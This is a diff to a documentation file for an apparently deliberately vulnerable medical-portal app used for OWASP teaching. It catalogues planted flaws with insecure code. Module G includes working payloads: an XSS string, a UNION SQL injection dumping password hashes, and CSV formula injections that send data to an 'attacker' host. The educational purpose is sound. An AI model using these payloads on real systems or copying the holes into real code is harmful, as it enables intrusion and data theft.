@@ -7,6 +7,30 @@ Branch: `vulnerable` | Purpose: OWASP Top 10:2025 education / attack demonstrati
 
 ---
 
+## Quick Navigation
+
+- **Lookup by OWASP category** → jump to [§ Final Index by Category](#final-index-by-category) at the bottom.
+- **Lookup by vulnerability number** → vulnerabilities are numbered sequentially `#1`–`#255` and grouped by area below.
+- **Cross-reference fixes** → see companion `VULN_FIX_MAP.md` for the fix-branch checklist.
+- **Total: 255 vulnerabilities** across 10 OWASP Top 10:2025 categories.
+
+### Coverage by OWASP Category
+
+| OWASP 2025 | Count | Key demos |
+|---|---|---|
+| A01 Broken Access Control | ~101 | IDOR everywhere, `permitAll()` on `/api/admin/**`, `/api/refills/**`, `/api/doctor/**` |
+| A02 Security Misconfiguration | ~31 | actuator open, headers disabled, runtime config override, secrets in URL |
+| A03 Software Supply Chain | ~31 | SQLi, XSS, XXE, SSTI (Freemarker), Nashorn RCE, command injection, deserialisation RCE |
+| A04 Cryptographic Failures | ~48 | MD5 unsalted passwords, hardcoded JWT/HMAC keys, plaintext PII, no TLS hardening |
+| A05 Injection | ~42 | stored XSS (`dangerouslySetInnerHTML`), path traversal, file upload, log injection |
+| A06 Insecure Design | ~35 | mass-assignment DTOs, JWT in localStorage, timing-attack equals, `java.util.Random` |
+| A07 Authentication Failures | ~46 | 30-day JWT, alg=none accepted, user enumeration, no rate limiting, sender spoofing |
+| A08 Data Integrity | ~31 | no content hashes, MD5 sign, unsigned PDFs, in-place overwrite, deserialisation RCE |
+| A09 Logging Failures | ~23 | passwords/JWTs logged, `clear-all-logs`, selective `DELETE /logs/{id}`, no hash chain |
+| A10 Exceptional Conditions | ~36 | fail-open catch, TOCTOU race, unbounded retry, swallowed exceptions, raw stack traces |
+
+---
+
 ## Added Files
 
 ### `docker-compose.yml`
@@ -124,6 +148,20 @@ Supports exploration of Server-Side Template Injection (SSTI) vulnerabilities.
 | V8 | `messages` | sender_id FK, receiver_id FK, content TEXT, sent_at, read_at |
 | V9 | `audit_logs` | user_id FK, action, entity_type, ip_address, user_agent, details |
 | V10 | seed data | admin + patient1 + doctor1 with MD5 passwords |
+| V11 | seed data | patient2/3, doctor2/3, labtech1, pharmacist1 (MD5 passwords) — covered by vuln #96 |
+| V12 | seed data | 35+ extra appointments / lab results / prescriptions / messages |
+| V13 | `users` profile cols | Adds `first_name`, `last_name`, `phone`, `address`, `city`, `country` as plain VARCHAR — extra `[A04]` PII-at-rest surface; reuses existing A04 entry, no new vuln number |
+| V14 | seed data | More lab results for `patient1` |
+| V15 | seed data | Backfill `first_name` / `last_name` on seeded users |
+| V16 | `refill_requests` | Async refill queue table — vulns #128–#144 |
+| V17 | cascade FKs | All `users(id)` FKs → `ON DELETE CASCADE` — supports vuln #148 |
+| V18 | cascade FKs | `prescriptions.medical_record_id`, `refill_requests.prescription_id` → CASCADE — supports vuln #176 |
+| V19 | `doctors` cols | `license_verified` + `license_document_path` — supports vulns #179/#184 |
+| V20 | `clinical_notes` | Module B Doctor — vulns #204–#213 |
+| V21 | `lab_orders` + `imaging_files` | Module C Doctor — vulns #214–#224 |
+| V22 | `prescriptions` cols | Signing columns + relaxes `medical_record_id` to nullable — vulns #225–#235 |
+| V23 | `telemedicine_sessions` | Module E Doctor — vulns #236–#244 |
+| V24 | `referrals` + AI cols | Module F Doctor — vulns #245–#255 |
 
 ### Vulnerabilities in Migrations
 
@@ -986,14 +1024,15 @@ No role check, no supervisor approval, no immutable audit sink. A PATIENT can ca
 
 ---
 
-## Logging Interceptor — `LoggingInterceptor`, `RequestCachingFilter`, `WebMvcConfig`
+## Logging Interceptor — `LoggingInterceptor`, `WebMvcConfig`
+
+> **Note:** an earlier `RequestCachingFilter.java` existed in this section; it was retired in favour of `ContentCachingFilter` (next section). The vulnerability surface is identical and lives entirely in the current `ContentCachingFilter`.
 
 ### New Files
 
 | File | Description |
 |---|---|
 | `interceptor/LoggingInterceptor.java` | `HandlerInterceptor` — logs IP, method, URI, params, request/response body, User-Agent, stack trace to `audit_logs` |
-| `interceptor/RequestCachingFilter.java` | `OncePerRequestFilter` — wraps every request/response with `ContentCachingRequestWrapper` / `ContentCachingResponseWrapper` so body bytes can be read after Spring MVC consumes them |
 | `config/WebMvcConfig.java` | `WebMvcConfigurer` — registers the interceptor on `/**` and the caching filter at order 1 |
 
 ### Vulnerabilities
@@ -1155,7 +1194,7 @@ If `ContentCachingFilter` triggers an `OutOfMemoryError` (see vulnerability 74),
 
 ### Changes
 
-- `config/WebMvcConfig.java` — removed manual `FilterRegistrationBean<RequestCachingFilter>`; body buffering now handled by `ContentCachingFilter` (`@Order(1)`)
+- `config/WebMvcConfig.java` — body buffering handled by `ContentCachingFilter` (`@Order(1)`)
 - `src/main/resources/application.yaml` — added `spring.servlet.multipart.max-file-size: -1` and `max-request-size: -1`
 
 ### Vulnerabilities
@@ -1952,8 +1991,7 @@ The dispense mutation sends `{ pharmacistId: user?.id }` in the request body. Th
 > on retry (CWE-362), unbounded retries (CWE-400), silent exception swallowing (CWE-755),
 > generic `Throwable` catches (CWE-396), missing null checks (CWE-754), schema-permitted
 > null inputs that feed validator NPEs (CWE-665), resource leaks on error paths (CWE-460),
-> and raw exception text returned to callers (CWE-209). See `A10_FEATURE_PLAN.md` for the
-> full design rationale and the demo attack scenarios.
+> and raw exception text returned to callers (CWE-209).
 
 ---
 
@@ -2139,7 +2177,7 @@ The detail dialog renders `failureReason` and `tempSlipPath` verbatim in `<pre>`
 
 ## Admin View Redesign — Module A (Users & Accounts)
 
-> Backend split: `AdminController` → `AdminUserController` + `AdminUserService` (user methods moved out). UI split: `pages/AdminPage.tsx` Users tab → `pages/admin/AdminUsersPage.tsx` + `pages/admin/AdminUserDetailPage.tsx`, with new `components/admin/ImpersonateBanner.tsx`. Frontend layout shell added: `auth/AdminRoute.tsx`, `components/admin/AdminSidebar.tsx`, `components/admin/AdminLayout.tsx`. See `ADMIN_VIEW_PLAN.md`.
+> Backend split: `AdminController` → `AdminUserController` + `AdminUserService` (user methods moved out). UI split: `pages/AdminPage.tsx` Users tab → `pages/admin/AdminUsersPage.tsx` + `pages/admin/AdminUserDetailPage.tsx`, with new `components/admin/ImpersonateBanner.tsx`. Frontend layout shell added: `auth/AdminRoute.tsx`, `components/admin/AdminSidebar.tsx`, `components/admin/AdminLayout.tsx`.
 
 ### New Files
 
@@ -2247,6 +2285,8 @@ Plaintext leaves the system in two ways:
 2. `ContentCachingFilter` + `LoggingInterceptor` capture the response body and persist it into `audit_logs.details`. Anyone with `GET /api/admin/logs` access (no role check, #67) reads every password ever reset.
 
 The random password itself is generated with `java.util.Random` instead of `SecureRandom` — predictable from process state ([A06]).
+
+**Frontend enhancement (2026-06-19):** The admin UI now opens a dialog where the caller can type an exact `newPassword` value. The endpoint accepts `{ "newPassword": "..." }` in the request body ([A07] — admin sets any password directly, bypassing any complexity policy). Leaving the field blank triggers server-side random generation. Both paths still leak the final plaintext in the response and in the audit log.
 
 ---
 
@@ -2891,8 +2931,7 @@ Role pulled from `localStorage`-decoded JWT payload (no signature check — see 
 
 ---
 
-### Phase 0 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)
-
+### Phase 0 Bug-Check Pass
 - Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with all 7 new controllers + 3 new pom deps).
 - Frontend `npx tsc -b --noEmit` → exit 0.
 - Frontend `npx eslint .` → 0 new errors, 7 pre-existing warnings (none in new doctor files).
@@ -3044,8 +3083,7 @@ Key is `patientId` alone (not `(doctorId, patientId)`), so when one doctor stars
 
 ---
 
-### Phase 1 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)
-
+### Phase 1 Bug-Check Pass
 - Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with the new `DoctorRosterController`, `DoctorRosterService`, `HandoffTokenIssuer`, four new DTOs).
 - Frontend `npx tsc -b --noEmit` → exit 0.
 - Frontend `npx eslint .` (touched files only) → 0 errors, 0 warnings.
@@ -3226,8 +3264,7 @@ The Import XML toolbar button calls `POST /api/doctor/notes/import` with the pic
 
 ---
 
-### Phase 2 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)
-
+### Phase 2 Bug-Check Pass
 - Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with the new entity, repo, two services, controller, plus the `V20__clinical_notes.sql` migration applied to the running DB).
 - Backend smoke (curl against running `localhost:8085`):
   - SSTI: inline `?new()` Execute payload executed `id` and the uid+groups landed in `renderedHtml`.
@@ -3381,8 +3418,7 @@ The form literally suggests two working SSRF payloads. Combined with #214 the de
 
 ---
 
-### Phase 3 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)
-
+### Phase 3 Bug-Check Pass
 - Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with new entities + repos + service + rewritten controller; V21 migration applied on DB already at V20).
 - Backend smoke (curl against running `localhost:8085`):
   - `customQueryUrl=file:///etc/hosts` returned the host file in `catalogueResponse`.
@@ -3557,10 +3593,9 @@ And the result panel shows both `rawResponse` (the bytes fetched) and `normalize
 
 ### Bug Caught During Phase 4 Bug Check
 
-- `GET /api/prescriptions` regressed to 500 immediately after V22 relaxed `medical_record_id` to nullable: existing `PrescriptionService#toDto` called `p.getMedicalRecord().getId()` without a null guard. Fixed by adding `p.getMedicalRecord() == null ? null : p.getMedicalRecord().getId()`. Re-smoke after fix: all routes return 200. This is the kind of cross-cutting regression that justifies the "per-phase bug check before continuing" protocol from `DOCTOR_VIEW_PLAN.md` §7.1.
+- `GET /api/prescriptions` regressed to 500 immediately after V22 relaxed `medical_record_id` to nullable: existing `PrescriptionService#toDto` called `p.getMedicalRecord().getId()` without a null guard. Fixed by adding `p.getMedicalRecord() == null ? null : p.getMedicalRecord().getId()`. Re-smoke after fix: all routes return 200. This is the kind of cross-cutting regression that justifies the "per-phase bug check before continuing" protocol.
 
-### Phase 4 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)
-
+### Phase 4 Bug-Check Pass
 - Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with rewritten controller, new service, signer, signature DTO; V22 migration applied on DB at V21).
 - Backend smoke (curl against running `localhost:8085`):
   - `POST /doctor/prescriptions` 200; `pharmacyCallbackUrl` POST fires.
@@ -3574,7 +3609,9 @@ And the result panel shows both `rawResponse` (the bytes fetched) and `normalize
 
 ---
 
-## Doctor View Redesign — Module E (Telemedicine — plaintext token, public iCal w/ PHI, recording SSRF)
+## Doctor View Redesign — Module E (Telemedicine — plaintext token, public iCal w/ PHI, recording SSRF) — **REMOVED**
+
+> **NOTE:** The Telemedicine tab was deleted from the Doctor Console. Backend files removed: `DoctorSessionController.java`, `DoctorSessionService.java`, `TelemedicineSession.java`, `TelemedicineSessionRepository.java`, `TelemedicineSessionDto.java`. Frontend files removed: `DoctorSessionsPage.tsx`, `DoctorSessionRoomPage.tsx`, `TelemedicineRoom.tsx`. Sidebar slot deleted. Vulnerabilities #236–#244 below marked 🚫 wont-fix in `VULN_FIX_MAP.md`. `V23__telemedicine_sessions.sql` migration left on disk for Flyway history continuity; the `telemedicine_sessions` table is now an orphan that gets created at boot but is never read or written. Phase 8 (SSRF) of `FIX_PLAN.md` no longer needs to cover the `attachRecording` sink.
 
 > Backend: `TelemedicineSession` JPA entity + repo + DTO, `DoctorSessionService`, and a rewritten `DoctorSessionController`. Migration `V23__telemedicine_sessions.sql` (renumbered from the original plan's V20 slot — V20–V22 were taken by the prior phases). UI: real `DoctorSessionsPage` + `DoctorSessionRoomPage` + `TelemedicineRoom` (an `<iframe>` pointing at `httpbin.org/anything` so the demo shows the join token landing in a real third-party `Referer` header in DevTools).
 >
@@ -3690,8 +3727,7 @@ The iCal response is served inline (`text/calendar`) with no `Content-Dispositio
 
 ---
 
-### Phase 5 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)
-
+### Phase 5 Bug-Check Pass
 - Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with new entity / repo / service / rewritten controller; V23 migration applied on DB at V22).
 - Backend smoke (curl against running `localhost:8085`):
   - `POST /doctor/sessions` 201; response contains `roomUrl` with the new token in the query string.
@@ -3706,7 +3742,7 @@ The iCal response is served inline (`text/calendar`) with no `Content-Dispositio
 
 ## Doctor View Redesign — Module F (AI Diagnostics & Referrals — deserialisation RCE, aiVerified integrity loss, API key leak)
 
-> Backend: new `Referral` JPA entity + `ReferralBundle` serializable + repo + `ReferralDto`, `DoctorReferralService`, `DoctorAIService`, rewritten `DoctorAIController` + `DoctorReferralController`. `MedicalRecord` entity extended with `aiVerified` + `aiModelUrl` columns. Migration `V24__referrals_and_ai_verified.sql` (renumbered from the plan's V21 slot). UI: `AIAssistantPanel` + `AIModelInfoCard` + `ReferralBundleViewer` components, rewritten `DoctorAIAssistantPage` + `DoctorReferralsPage`.
+> Backend: new `Referral` JPA entity + `ReferralBundle` serializable + repo + `ReferralDto`, `DoctorReferralService`, `DoctorAIService`, rewritten `DoctorAIController` + `DoctorReferralController`. `MedicalRecord` entity extended with `aiVerified` + `aiModelUrl` columns. Migration `V24__referrals_and_ai_verified.sql` (renumbered from the plan's V21 slot). UI: `AIAssistantPanel` + `AIModelInfoCard` (both exported from `components/doctor/AIAssistantPanel.tsx`) + `ReferralBundleViewer` components, rewritten `DoctorAIAssistantPage` + `DoctorReferralsPage`.
 >
 > Module F is the showcase **A08 (integrity)** module: textbook Java deserialisation RCE on the referrals inbox endpoint *and* LLM responses stored as authoritative `MedicalRecord` rows. Also adds heavy **A02** (hardcoded API key returned in clear via `/model-info` and sent on every outbound request even when the caller redirects to an attacker host) and **A03** (modelUrl SSRF with full PHI exfil).
 
@@ -3782,7 +3818,7 @@ Live demo: `GET /api/doctor/ai/model-info` returned:
  "apiKey":"sk-mediconnect-prod-OZk1JxFhvE2pXt9rW3aB7Cq",
  "model":"gpt-medi-clinical-v1","status":"ok"}
 ```
-Frontend `AIModelInfoCard` renders the key in plain text in the side panel, no copy-restriction. Compounds with #248 — every doctor opening the AI Assist page reads + displays the prod key.
+Frontend `AIModelInfoCard` (exported from `components/doctor/AIAssistantPanel.tsx`) renders the key in plain text in the side panel, no copy-restriction. Compounds with #248 — every doctor opening the AI Assist page reads + displays the prod key.
 
 ---
 
@@ -3870,8 +3906,9 @@ Already noted in #249, listed separately because it is a distinct misconfigurati
 
 ---
 
-### Phase 6 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)
+> **NOTE (Appointments redesign):** entries #247, #248, #249, #250, #251, #255 above describe the AI Assist surface that was **removed** in the Appointments-tab redesign — see `APPOINTMENTS_PLAN.md` and the "Doctor View Redesign — Module G" section below. Numbering preserved for cross-reference stability (entry #255 names #249). Deleted files: `DoctorAIController.java`, `DoctorAIService.java`, `DoctorAIAssistantPage.tsx`, `AIAssistantPanel.tsx`. Module F's Referral half (#245, #246, #252, #253, #254) survives.
 
+### Phase 6 Bug-Check Pass
 - Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with two new controllers, two new services, new entity / repo / DTOs, plus the V24 migration applied on DB at V23).
 - Backend smoke (curl against running `localhost:8085`):
   - `GET /doctor/ai/model-info` → API key returned in clear.
@@ -3881,6 +3918,198 @@ Already noted in #249, listed separately because it is a distinct misconfigurati
 - Frontend `npx tsc -b --noEmit` → exit 0.
 - Frontend `npx eslint` (touched files only) → 0 errors, 0 warnings.
 - Cross-repo regression: 17 endpoints (8 existing + 9 doctor modules across 6 phases) all 200.
+
+---
+
+## Doctor View Redesign — Module G (Appointments Tab — replaces removed AI Assist)
+
+> Backend: new `DoctorAppointmentController` + `DoctorAppointmentService`, two new DTOs (`AppointmentRowDto`, `ConflictPairDto`), small additive migration `V25__appointment_doctor_columns.sql` (actor_doctor_id, decline_reason, no_show, rescheduled_at, original_date — all nullable / default-false). UI: rewritten `DoctorAppointmentsPage` (Today / Upcoming / Pending / Past / Conflicts tabs), `RescheduleDialog`, `CompleteAppointmentDialog`, sidebar swap (Sparkles → Calendar).
+>
+> AI Assist surface (controller, service, page, panel, `aiModelInfo`/`aiSuggest`/`aiSummarizeRecord` wrappers, four type aliases) deleted. `MedicalRecord.aiVerified` + `aiModelUrl` columns stay (Referrals still writes them). Entries #247/#248/#249/#250/#251/#255 above struck through with the note at the top of the Phase 6 section.
+>
+> Module G's primary focus is **A06 (Insecure Design)** — no double-book check, no rate limit on no-show, no row cap on bulk-status / CSV import. Secondary: **A03 (Software Supply Chain)** via CSV formula injection on export + unbounded CSV import; **A07 (Auth)** via `actorDoctorId` from body; **A08 (Integrity)** via in-place reschedule overwrite + auto-MedicalRecord on complete.
+
+### New Files
+
+| File | Description |
+|---|---|
+| `db/migration/V25__appointment_doctor_columns.sql` | Adds `actor_doctor_id`, `decline_reason`, `no_show`, `rescheduled_at`, `original_date` to `appointments` (all nullable / default-false) |
+| `entity/Appointment.java` (edited) | Six new fields wired to V25 columns |
+| `dto/AppointmentRowDto.java`, `dto/ConflictPairDto.java` | Response shapes |
+| `service/DoctorAppointmentService.java` | list (raw SQL `q` concat), today, conflicts, approve, decline, reschedule, complete, no-show, bulk-status, import CSV, export CSV |
+| `controller/DoctorAppointmentController.java` | 11 endpoints wired |
+| **Frontend** `api/doctor.ts` (extended) | `AppointmentRow` + `ConflictPair` types + 11 typed wrappers; AI Assist wrappers + types removed |
+| **Frontend** `components/doctor/RescheduleDialog.tsx`, `CompleteAppointmentDialog.tsx` | Workflow modals |
+| **Frontend** `pages/doctor/DoctorAppointmentsPage.tsx` (rewritten) | Five tabs + filter bar + bulk toolbar + import/export buttons |
+| **Frontend** `components/doctor/DoctorSidebar.tsx` (edited) | `Sparkles → AI Assist [A03]` replaced with `Calendar → Appointments [A06]` |
+| `pages/doctor/DoctorAIAssistantPage.tsx` (deleted), `components/doctor/AIAssistantPanel.tsx` (deleted), `controller/DoctorAIController.java` (deleted), `service/DoctorAIService.java` (deleted) | AI Assist surface removed |
+
+### Vulnerabilities
+
+**256. [A06] `POST /api/doctor/appointments/{id}/approve` has no double-book check — `DoctorAppointmentService.java#approve`**
+```java
+public AppointmentRowDto approve(Long id, Map<String, Object> body) {
+    Appointment a = appointmentRepository.findById(id).orElseThrow(...);
+    a.setStatus(AppointmentStatus.APPROVED);
+    a.setActorDoctorId(numericId(body, "actorDoctorId"));
+    return toDto(appointmentRepository.save(a));
+}
+```
+No query against existing APPROVED rows in the same `doctorId × scheduledAt` window. The same doctor can be approved for two overlapping slots — `/conflicts` endpoint surfaces the failure mode after the fact, but doesn't block it on write.
+
+---
+
+**257. [A07] `actorDoctorId` from request body — `DoctorAppointmentService.java#approve` + `#decline`**
+```java
+a.setActorDoctorId(numericId(body, "actorDoctorId"));
+```
+No JWT correlation, no `SecurityContextHolder.getName()` cross-check. Caller writes any doctor's id as the approver — the appointments inbox table then renders `[A07] actor #99` next to the row. Live demo: `POST /api/doctor/appointments/1/approve {"actorDoctorId":99}` returned `actorDoctorId: 99`.
+
+---
+
+**258. [A05] Decline reason rendered with `dangerouslySetInnerHTML` on the inbox — `DoctorAppointmentsPage.tsx` + service**
+Backend stores raw:
+```java
+a.setDeclineReason(body.get("declineReason").toString());
+```
+Frontend renders raw:
+```tsx
+<div className="mt-1 text-[10px] text-[#F85149]"
+     dangerouslySetInnerHTML={{ __html: r.declineReason }} />
+```
+The Decline button prompt literally pre-fills `<img src=x onerror=alert(1)>` as the placeholder. Every doctor opening the Appointments page runs the payload.
+
+---
+
+**259. [A08] `POST /{id}/reschedule` overwrites `requestedDate` in place — `DoctorAppointmentService.java#reschedule`**
+```java
+a.setOriginalDate(a.getRequestedDate());
+a.setRequestedDate(LocalDateTime.parse(newAt));
+a.setRescheduledAt(LocalDateTime.now());
+```
+Only ONE prior value preserved in `original_date`. Successive reschedules clobber each other — no revision table, no audit row. Reason is appended to `notes` with `" | "` separator and no escaping, so multi-line reasons collide with existing notes.
+
+---
+
+**260. [A08] `POST /{id}/complete` auto-creates a `MedicalRecord` with caller-supplied `notes` as `diagnosis` — `DoctorAppointmentService.java#complete`**
+```java
+MedicalRecord rec = MedicalRecord.builder()
+        .patient(a.getPatient())
+        .doctor(a.getDoctor())
+        .appointment(a)
+        .diagnosis(notes)
+        .prescription("Auto-created from appointment #" + a.getId())
+        ...
+        .build();
+medicalRecordRepository.save(rec);
+```
+No signature, no countersignature, no `aiVerified`-style ribbon to flag the row as low-trust. The MedicalRecord appears in the patient chart on next refresh as a normal clinical row. Compounds with the Module B note-editor surface (#207) and Module F referral-accept surface (#246) — three independent paths now write authoritative MedicalRecord rows from caller-controlled input.
+
+---
+
+**261. [A06] `POST /{id}/no-show` has no rate limit — `DoctorAppointmentService.java#noShow`**
+Single setter, no per-doctor cap, no time-window throttle. A loop over every appointment id flags every patient as no-show in seconds. Compounds with the (`/bulk-status`) sibling — both leave the system in a degraded state in one POST.
+
+---
+
+**262. [A06][A09] `POST /bulk-status` unbounded `ids` list — `DoctorAppointmentService.java#bulkStatus`**
+```java
+for (Object o : ids) { ... a.setStatus(s); appointmentRepository.save(a); ... }
+return Map.of("updated", updated, "requested", ids.size());
+```
+No size cap, no transactional rollback on partial failure, **single audit row** in the global `LoggingInterceptor` covers all N mutations. Compounds the admin `bulk-delete` pattern (#152 / Module A admin redesign).
+
+---
+
+**263. [A06] CSV import accepts unbounded row count — `DoctorAppointmentService.java#importCsv`**
+```java
+while ((line = br.readLine()) != null) { ... appointmentRepository.save(a); rows++; }
+```
+No row cap, no size cap, no streaming insert (each row hits the DB synchronously). A 10M-row CSV OOMs the JVM heap or saturates the connection pool. Same A06 design failure family as the admin `bulk-delete` and Module C `/lab-orders` listing.
+
+---
+
+**264. [A03] CSV export — formula injection on `notes` cells — `DoctorAppointmentService.java#exportCsv`**
+```java
+private String safe(String s) {
+    if (s == null) return "";
+    // [A03] We DO NOT strip leading =/+/-/@ — that's the formula-injection demo.
+    return s.replace("\r", " ").replace("\n", " ").replace(",", ";");
+}
+```
+A `notes` field starting with `=`, `+`, `-`, `@` becomes an executable formula when the CSV is opened in Excel / LibreOffice. Classic payloads:
+- `=cmd|'/c calc'!A1` — DDE-launched calc.exe on Windows machines with DDE enabled.
+- `=HYPERLINK("http://attacker/?d="&A1,"click")` — exfil via a single click in the analyst's browser.
+- `=WEBSERVICE("http://attacker/?d="&A1)` — silent exfil on Excel without sandbox.
+
+Live demo: setting an appointment's `notes` to `=cmd|'/c calc'!A1` via `/import` (#265) then `GET /export.csv` returns the value verbatim — Excel will fire DDE on open.
+
+---
+
+**265. [A03] CSV import passes formula payloads through verbatim — `DoctorAppointmentService.java#importCsv`**
+```java
+String[] cols = line.split(",", -1);
+...
+String notes = cols.length > 3 ? cols[3] : "";
+Appointment a = Appointment.builder()...notes(notes)...build();
+appointmentRepository.save(a);
+```
+Naive `String.split(",")` (no CSV quoting, no escape handling), no formula sanitisation. An attacker drops a 2-row CSV with a formula payload in the notes column; the rows land in `appointments`; the next export ships the formula back out to any analyst who downloads it. Stored-payload chain: **import → DB → export → spreadsheet RCE class**.
+
+---
+
+**266. [A02] `GET /export.csv` served without `Content-Disposition: attachment` — `DoctorAppointmentController.java#exportCsv`**
+```java
+HttpHeaders h = new HttpHeaders();
+h.setContentType(MediaType.parseMediaType("text/csv"));
+// [A02] No Content-Disposition — opens inline in browser, caches it.
+return new ResponseEntity<>(csv, h, 200);
+```
+Without `attachment` disposition, modern browsers open the CSV inline (or render it as a text document) and cache the URL. The body — full patient names, scheduled times, decline reasons — lands in browser history and on-disk cache. Compounds with the iCal feed pattern from Module E (#237 / #244).
+
+---
+
+**267. [A05] `GET /api/doctor/appointments?q=` raw SQL concat — `DoctorAppointmentService.java#list`**
+```java
+sql.append(" AND a.notes LIKE '%").append(q).append("%'");
+...
+if (status != null && !status.isBlank()) sql.append(" AND a.status = '").append(status).append("'");
+```
+Three concatenation sites (`q`, `status`, `from`/`to`) on a `createNativeQuery` against the appointments table. Same primitive as Module A roster (#194); the new instance is the SQL-injection demo for a non-PII table. Demo payload:
+```
+?q=%25%27%20UNION%20SELECT%20id%2Cusername%2Cpassword_hash%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%20FROM%20users%20--
+```
+
+---
+
+**268. [A01] `GET /api/doctor/appointments/conflicts` returns every doctor's overlaps with patient PII — `DoctorAppointmentService.java#conflicts`**
+```java
+List<Appointment> rows = doctorId == null
+        ? appointmentRepository.findAll()
+        : appointmentRepository.findByDoctorId(doctorId);
+```
+Calling without `?doctorId` returns every doctor's scheduling conflicts, each row containing both patients' full names plus the slot times. Useful enumeration primitive for an attacker mapping the clinic's workload.
+
+---
+
+### Phase A–D Bug-Check Pass
+
+- Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` after V25 migration applied on DB at V24.
+- Backend smoke (curl against running `localhost:8085`):
+  - All 11 new `/api/doctor/appointments/*` endpoints return 200.
+  - `POST /1/approve {actorDoctorId:99}` → row's `actorDoctorId = 99` (A07 demo).
+  - `POST /2/decline {declineReason:"<img src=x onerror=alert(1)>"}` → stored verbatim (A05).
+  - `POST /3/reschedule {newScheduledAt:"2026-07-01T15:00:00"}` → `originalDate` preserves single prior value (A08).
+  - `POST /bulk-status {ids:[1..10], status:"COMPLETED"}` → `{updated:10, requested:10}` (A06).
+  - `POST /import` with 2-row CSV including `=cmd|'/c calc'!A1` → row stored; subsequent `GET /export.csv` returned the formula verbatim (A03).
+  - `GET /doctor/ai/*` returns 500 (no handler) — AI Assist surface verifiably gone.
+- Frontend `npx tsc -b --noEmit` → exit 0 (after deleting AI components / page and swapping the sidebar item).
+- Frontend `npx eslint` (touched files) → 0 errors, 0 warnings.
+- Cross-repo regression: 20 endpoints (8 existing + 7 prior doctor modules + 5 Module G + replaced sidebar) → all 200.
+
+### Bug Caught During Phase D Bug Check
+
+- `GET /api/doctor/appointments` (no filter) returned 500 with `ClassCastException: Boolean cannot be cast to Number` on the first smoke. Cause: native-query column `no_show` (MySQL `BOOLEAN`) returns `java.lang.Boolean` not `Number`. Fix: added `toBool(Object)` helper to `DoctorAppointmentService` and routed the `no_show` cell through it. Re-smoke after fix: all routes 200.
 
 ---
 
@@ -3907,6 +4136,10 @@ The three least-covered categories at session start (A02, A03, A08 — all 19) e
 
 
 
+<a id="final-index-by-category"></a>
+
+## Final Index by Category
+
 > Rows are ordered to match the **OWASP Top 10:2025** list. Where the old project labels merged
 > two related buckets (e.g. file-upload / path-traversal under `[A03]` + XSS / SQLi under `[A05]`),
 > those entries are now consolidated under the appropriate 2025 category.
@@ -3922,4 +4155,87 @@ The three least-covered categories at session start (A02, A03, A08 — all 19) e
 | A07 | Authentication Failures | `JwtUtil.java` (30-day expiry, algorithm confusion), `JwtAuthenticationFilter.java` (skip expiry paths, swallowed exceptions), `AuthService.java` (user enumeration, no rate limiting), `CustomUserDetailsService.java` (user enumeration), all `*Dto.java`; `UserController.java` (`GET /delete/{id}` — delete via GET); `MessageService.java` (sender spoofing); `PrescriptionService.java` (pharmacistId from body #109); `AdminUserController.java` (role from body → instant ADMIN creation); `AdminUserService.java#updateUser` (mass-assignment of passwordHash/lockedUntil/active #147); `AdminUserService.java#unlock` (clears lockedUntil + failedLoginAttempts — defeats brute-force lockout #149); `AdminUserService.java#impersonate` (JWT minted for any user, no MFA, no audit #151); `AdminClinicalService.java#updatePrescription` (mass-assigns patientId / dispensedAt — medication-history forgery #174); `AdminStaffService.java#onboardStaff` (multipart role accepted incl. ADMIN — second unauth ADMIN-creation surface #182); `AdminBroadcastService.java#broadcast` (senderId from body — broadcast attributed to any user #186); **Frontend**: `RegisterPage.tsx` (ADMIN role selectable on signup); `AdminPage.tsx` (role change Mass Assignment #87; create user role from body #119); `MessagesPage.tsx` (senderId editable in compose form #88; replySenderId editable in inline reply — impersonate any user #117); `PrescriptionsPage.tsx` (pharmacistId from request body — audit identity spoofable #127) |
 | A08 | Software or Data Integrity Failures | `MedicalRecord.java` (no content_hash); `AppointmentController.java` (PDF without Content-MD5); `MedicalRecordService.java` (no hash computed at upload); `ContentCachingFilter.java` + `application.yaml` (unbounded heap buffering, CWE-400 DoS via single oversized request); `AdminClinicalService.java#overrideLabResultValue` (mutates resultValue/referenceRange with no amended flag, original value lost #177); `AdminBroadcastService.java#redact` (overwrites Message.content in place, no original preserved #188) |
 | A09 | Security Logging and Alerting Failures | `AdminAuditController.java` (`POST /logs/clear` permanently deletes entire audit trail without authorization — evidence destruction attack; `DELETE /logs/{id}` selective tampering #160); `AdminUserService.java#deleteUser` (hard-delete of any account incl. ADMIN, no archive #148); `AdminUserService.java#bulkDelete` (single audit entry covers many ids #152); `AdminClinicalService.java#deleteMedicalRecord` (hard-delete clinical history + cascade via V18 #176); `AdminBroadcastService.java#redact` (message content overwritten, original lost; pairs with #160 to fully erase the message #188); `AdminOpsService.java#setConfig` (runtime mutation can disable dynamic-read audit hooks #167); `LoggingInterceptor.java` (plaintext passwords and JWT tokens stored in audit_logs); `AdminPage.tsx` (Clear All Logs button fires immediately with no confirmation — single click destroys forensic timeline #123) |
